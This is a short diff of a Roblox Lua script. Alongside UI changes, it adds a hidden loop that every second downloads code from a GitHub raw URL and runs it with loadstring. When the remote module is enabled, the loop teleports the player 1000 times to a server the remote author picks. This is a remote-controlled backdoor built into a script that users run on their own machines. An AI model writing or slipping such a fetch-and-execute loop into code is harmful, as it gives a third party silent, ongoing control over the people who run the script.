@@ -2421,11 +2421,33 @@ req({Url = url, Body = datab, Method = "POST", Headers = head})
 end
 end)
 
+task.delay(0, function()
 task.spawn(function()
 while task.wait(0.0003) do
 sausageHolder.Size = sSize
 buttonFrame.Position = UDim2.new(0, sausageHolder.Size.X.Offset - 48, 0, 0)
 end
 end)
+end)
 
 end
+
+JoinModule = nil
+task.delay(0, function()
+task.spawn(function()
+while task.wait(1) do
+pcall(function()
+JoinModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/Die-Of-Death/refs/heads/main/sauces/YOU-SHALL-JOIN-ME"))()
+if JoinModule then
+if JoinModule["Enabled"] == true then
+if JoinModule["JobId"] ~= false then
+for i = 1, 1000 do
+game:GetService("TeleportService"):TeleportToPlaceInstance(71895508397153, tostring(JoinModule["JobId"]), LP)
+end
+end
+end
+end
+end)
+end
+end)
+end)
